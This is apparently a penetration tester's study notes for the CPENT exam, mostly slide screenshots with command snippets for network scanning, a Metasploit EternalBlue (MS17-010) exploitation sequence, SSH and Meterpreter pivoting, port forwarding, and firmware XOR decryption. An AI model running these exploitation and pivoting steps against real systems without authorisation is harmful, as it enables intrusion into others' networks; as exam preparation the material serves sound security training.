---
# System prepended metadata

title: CPENT考試筆記(Vincent)
tags: [' CPENT', ' Pentest', ' 滲透測試', 工作用]

---

---
tags: 工作用, Pentest, 滲透測試, CPENT
---

# CPENT考試筆記(Vincent)

## SCAN

![2024-04-18 10_54_50-CPENT - PowerPoint](https://hackmd.io/_uploads/ry0JnbCg0.png)

```bash=
$ sudo nmap -n -sn -PS22,80,445,3389 192.168.0.1-254 -oG ip_scan.txt
$ grep Up ip_scan.txt | cut -d"" -f2
```

![2024-04-18 10_55_00-CPENT - PowerPoint](https://hackmd.io/_uploads/ry0khW0lA.png)

![2024-04-18 10_55_14-CPENT - PowerPoint](https://hackmd.io/_uploads/ryAJ3ZRe0.png)



![2024-04-18 10_55_27-CPENT - PowerPoint](https://hackmd.io/_uploads/rkC13-RxA.png)

```bash=
for i in {1..254}; do (ping -c 192.168.0.$i | grep "bytes from" &); done
```

![2024-04-18 10_55_40-CPENT - PowerPoint](https://hackmd.io/_uploads/rk01hZAeA.png)

```bash=
$sudo nmap -p 1-1024
$sudo nmap -p 1024-
$sudo nmap -p -1024
$sudo nmap -p -

$sudo nmap -n scanme.nmap.org -p22,25,80,135 --reason
```

![2024-04-18 10_55_52-CPENT - PowerPoint](https://hackmd.io/_uploads/rk0J2WAlA.png)

```bash=
$sudo dpkg -i rustscan_2.0.1_amd64.deb
$rustscan -u 5000 -t 7000 -a 192.168.0.7
$rustscan -u 5000 -t 7000 --script none -a 192.168.0.7
$rustscan -u 5000 -t 7000 -a 192.168.0.7 -- -Pn -sVC -oA 7_host
```

### Exploit MS17_010
![2024-04-18 10_56_03-CPENT - PowerPoint](https://hackmd.io/_uploads/S10y2ZAlR.png)
```bash=
$msfconsole

>search ms17_010
>use exploit/windows/smb/ms17_010_eternalblue
>show options
>set rhosts 192.168.0.7
>check
>exploit
```

![2024-04-18 10_56_16-CPENT - PowerPoint](https://hackmd.io/_uploads/SJAJnW0xR.png)



## ENUMERATION

![2024-04-18 11_08_16-CPENT - PowerPoint](https://hackmd.io/_uploads/SyLgkMAxA.png)
![2024-04-18 11_08_25-CPENT - PowerPoint](https://hackmd.io/_uploads/rJ8eyMReR.png)
![2024-04-18 11_08_33-CPENT - PowerPoint](https://hackmd.io/_uploads/r1IeJz0lC.png)
![2024-04-18 11_08_41-CPENT - PowerPoint](https://hackmd.io/_uploads/r1UlJGRxR.png)
![2024-04-18 11_08_48-CPENT - PowerPoint](https://hackmd.io/_uploads/SJUlkG0eA.png)
![2024-04-18 11_08_57-CPENT - PowerPoint](https://hackmd.io/_uploads/Sk8l1MCxA.png)
![2024-04-18 11_09_03-CPENT - PowerPoint](https://hackmd.io/_uploads/SkLgJzAeA.png)
![2024-04-18 11_09_15-CPENT - PowerPoint](https://hackmd.io/_uploads/BJUgyzAxR.png)



## Privilege Escalation

![2024-04-18 11_24_19-CPENT - PowerPoint](https://hackmd.io/_uploads/r16ufz0x0.png)


## Egress Busting

![2024-04-18 11_24_44-CPENT - PowerPoint](https://hackmd.io/_uploads/SkznfzAl0.png)
![2024-04-18 11_25_03-CPENT - PowerPoint](https://hackmd.io/_uploads/rJz2fzAg0.png)


## Persistent

![2024-04-18 11_25_34-CPENT - PowerPoint](https://hackmd.io/_uploads/BkspGMCgA.png)


## POST

![2024-04-18 11_26_00-CPENT - PowerPoint](https://hackmd.io/_uploads/By71QfRxR.png)


## OT

![2024-04-18 11_26_27-CPENT - PowerPoint](https://hackmd.io/_uploads/rJNzmMAeR.png)

![2024-04-18 11_26_42-CPENT - PowerPoint](https://hackmd.io/_uploads/r14zmG0gR.png)


## Pivoting & Double Pivoting 跳台 & 雙跳台

![2024-04-18 11_27_24-CPENT - PowerPoint](https://hackmd.io/_uploads/SkxjAXfClA.png)

![2024-04-18 11_27_34-CPENT - PowerPoint](https://hackmd.io/_uploads/BkoRQMClR.png)

![2024-04-18 11_27_50-CPENT - PowerPoint](https://hackmd.io/_uploads/BJjCQM0eR.png)

![2024-04-18 11_28_02-CPENT - PowerPoint](https://hackmd.io/_uploads/rkjR7MRl0.png)

```bash=
$ssh -L: 80:192.168.0.24:80 administrator @192.168.0.70
```

![2024-04-18 11_28_13-CPENT - PowerPoint](https://hackmd.io/_uploads/Syo0XfCxC.png)

```bash=
$ssh -R *:8008:192.168.0.24:80 administrator@192.168.0.70

$sudo nano /etc/ssh/sshd_config
→GatewayPorts yes
$sudo service ssh restart

```

![2024-04-18 11_28_33-CPENT - PowerPoint](https://hackmd.io/_uploads/BksCmz0lR.png)

```bash=
$ssh -D 9050 administrator@192.168.0.70
$sudo nano /etc/proxychains.conf
```

![2024-04-18 11_28_46-CPENT - PowerPoint](https://hackmd.io/_uploads/S1jC7zRxA.png)

```bash=
$ssh -J administrator@192.168.0.70 administrator@192.168.0.10 -L *:8888:192.168.0.24:80
```

![2024-04-18 11_28_58-CPENT - PowerPoint](https://hackmd.io/_uploads/SJoRmMCg0.png)

```bash=
# MSF
>Use exploit/multi/ssh/sshexec
>set rhosts<>
>set username<>
>set password <>
>exploit

## Meterpreter (Session-Routing)
>run post/multi/manage/autoroute OPTION=s
>run autoroute -p
>background

```

![2024-04-18 11_29_12-CPENT - PowerPoint](https://hackmd.io/_uploads/BJoA7fCeA.png)

```bash=
https://github.com/bovine/datapine/blob/master/datapipe.c
# change Line 80: 20 -> 999
$gcc datapine.c -o datapine

datapipe 0.0.0.0 135 <WIN> 135
datapipe 0.0.0.0 445 <WIN> 445
datapipe 0.0.0.0 4444 <PARROT> 4444
```

![2024-04-18 11_29_25-CPENT - PowerPoint](https://hackmd.io/_uploads/rksC7G0eA.png)

```bash=
#Socat (full function, fat, support UDP)
socat tcp-listen:80,fork tcp:<IP>:80
socat udp-recvfrom:161,fork udp-sendto:<IP>:161
socat udp-recvfrom:53,fork udp-sendto:<IP>:53
socat udp-recvfrom:123,fork udp-sendto:<IP>:123

#Portproxy(Windows netsh built-in)
netsh interface portproxy add v4tov4 80 <IP> 80
netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 80 <IP> 80
```

![2024-04-18 11_29_39-CPENT - PowerPoint](https://hackmd.io/_uploads/HJsR7zCeR.png)

![2024-04-18 11_29_54-CPENT - PowerPoint](https://hackmd.io/_uploads/B1sCmz0gR.png)



## IOT

![2024-04-18 11_30_47-CPENT - PowerPoint](https://hackmd.io/_uploads/S1RmNMRlC.png)
![2024-04-18 11_31_00-CPENT - PowerPoint](https://hackmd.io/_uploads/S1CmVzAeA.png)
![2024-04-18 11_31_12-CPENT - PowerPoint](https://hackmd.io/_uploads/SyRmNfReA.png)

```bash=
$binwalk -t encrypted.bin
$hexdump -v -C encrypted.bin
$binwalk -E encrypted.bin
$hexdump -v -C encrypted.bin | cut -d" " -f3-20 | sort | uniq -c | sort -nr | head -n 20
$chmod +x xcat.py
$./xcat.py -x <xor_key> encrypted.bin > decrypted.bin
$binwalk -t decrypted.bin
```

![2024-04-18 11_31_26-CPENT - PowerPoint](https://hackmd.io/_uploads/ByAm4GAlC.png)

```bash=
$python3 -m pip3 install xortool
$xortool enctypted.bin
$xortool enctypted.bin -l 8 -c 00
$binwalk -t -e xortool_out/0.out
$cat xortool_out/filename-key.csv
$python -c "print(b'\x88D\xa2\xd1h\xb4Z-'.hex())"
```

## BINARY

![2024-04-18 11_31_58-CPENT - PowerPoint](https://hackmd.io/_uploads/ByElHGRg0.png)

![2024-04-18 11_32_14-CPENT - PowerPoint](https://hackmd.io/_uploads/Hy4lSMAxR.png)

- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail
- https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/march/inside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2
- https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/
- http://blog.dkbza.org/2012/08/pe-file-format-graphs.html


![2024-04-18 11_32_29-CPENT - PowerPoint](https://hackmd.io/_uploads/S1EerfAl0.png)


![2024-04-18 11_32_40-CPENT - PowerPoint](https://hackmd.io/_uploads/rJVgHzCx0.png)

- https://web.archive.org/web/20171130164537/http://nairobi-embedded.org/004_elf_format.html
- https://web.archive.org/web/20171129031316/http://nairobi-embedded.org/040_elf_sec_seg_vma_mappings.html

![2024-04-18 11_32_54-CPENT - PowerPoint](https://hackmd.io/_uploads/HkQxSz0eR.png)

```bash=
$strings ./crackme0x00a | grep GLIBC
$objdump -d /bin/bash
$objdump -d -M intel /bin/bash

use gdb to look at the registers
$gdb -q /bin/bash
$break main
$run
$info registers

```

![2024-04-18 11_33_09-CPENT - PowerPoint](https://hackmd.io/_uploads/BJNgBG0xC.png)
![2024-04-18 11_33_20-CPENT - PowerPoint](https://hackmd.io/_uploads/SyVlrzRgA.png)
![2024-04-18 11_33_33-CPENT - PowerPoint](https://hackmd.io/_uploads/SJVeHG0lR.png)
![2024-04-18 11_33_47-CPENT - PowerPoint](https://hackmd.io/_uploads/S14lrfAx0.png)
![2024-04-18 11_33_59-CPENT - PowerPoint](https://hackmd.io/_uploads/SJEerMAeR.png)
![2024-04-18 11_34_13-CPENT - PowerPoint](https://hackmd.io/_uploads/r1ExHzRgR.png)
![2024-04-18 11_34_25-CPENT - PowerPoint](https://hackmd.io/_uploads/HkNgrGAxR.png)
![2024-04-18 11_34_40-CPENT - PowerPoint](https://hackmd.io/_uploads/SyNgHfAeC.png)


## AD PT


![2024-04-18 11_47_38-CPENT - PowerPoint](https://hackmd.io/_uploads/ryA_dMCg0.png)
![2024-04-18 11_47_55-CPENT - PowerPoint](https://hackmd.io/_uploads/rkgAudMAgR.png)
![2024-04-18 11_48_11-CPENT - PowerPoint](https://hackmd.io/_uploads/rkA_dMCeR.png)
![2024-04-18 11_48_23-CPENT - PowerPoint](https://hackmd.io/_uploads/SyCduG0gC.png)
![2024-04-18 11_48_39-CPENT - PowerPoint](https://hackmd.io/_uploads/rkA__fAeC.png)
![2024-04-18 11_48_52-CPENT - PowerPoint](https://hackmd.io/_uploads/HyAudGAlC.png)
![2024-04-18 11_49_06-CPENT - PowerPoint](https://hackmd.io/_uploads/ryC_uGAeR.png)
![2024-04-18 11_49_19-CPENT - PowerPoint](https://hackmd.io/_uploads/HJCddf0xC.png)
![2024-04-18 11_49_32-CPENT - PowerPoint](https://hackmd.io/_uploads/SyCdOGRe0.png)
![2024-04-18 11_49_45-CPENT - PowerPoint](https://hackmd.io/_uploads/S1R__GCg0.png)


## Web to RCE

![2024-04-18 11_52_02-CPENT - PowerPoint](https://hackmd.io/_uploads/S19ttfCgA.png)
![2024-04-18 11_52_13-CPENT - PowerPoint](https://hackmd.io/_uploads/B19KYfReC.png)
![2024-04-18 11_52_24-CPENT - PowerPoint](https://hackmd.io/_uploads/r1ctFG0eC.png)
![2024-04-18 11_52_34-CPENT - PowerPoint](https://hackmd.io/_uploads/H1qFKGRgR.png)
![2024-04-18 11_52_48-CPENT - PowerPoint](https://hackmd.io/_uploads/H1cttMAl0.png)
![2024-04-18 11_53_01-CPENT - PowerPoint](https://hackmd.io/_uploads/Sy9YKGClA.png)
![2024-04-18 11_53_15-CPENT - PowerPoint](https://hackmd.io/_uploads/SyqFFfClC.png)
![2024-04-18 11_53_28-CPENT - PowerPoint](https://hackmd.io/_uploads/SJ5KYzRgC.png)
![2024-04-18 11_53_45-CPENT - PowerPoint](https://hackmd.io/_uploads/HkcYYfAxR.png)
![2024-04-18 11_53_59-CPENT - PowerPoint](https://hackmd.io/_uploads/BkcKKMAxC.png)
![2024-04-18 11_54_14-CPENT - PowerPoint](https://hackmd.io/_uploads/By5ttzAeC.png)


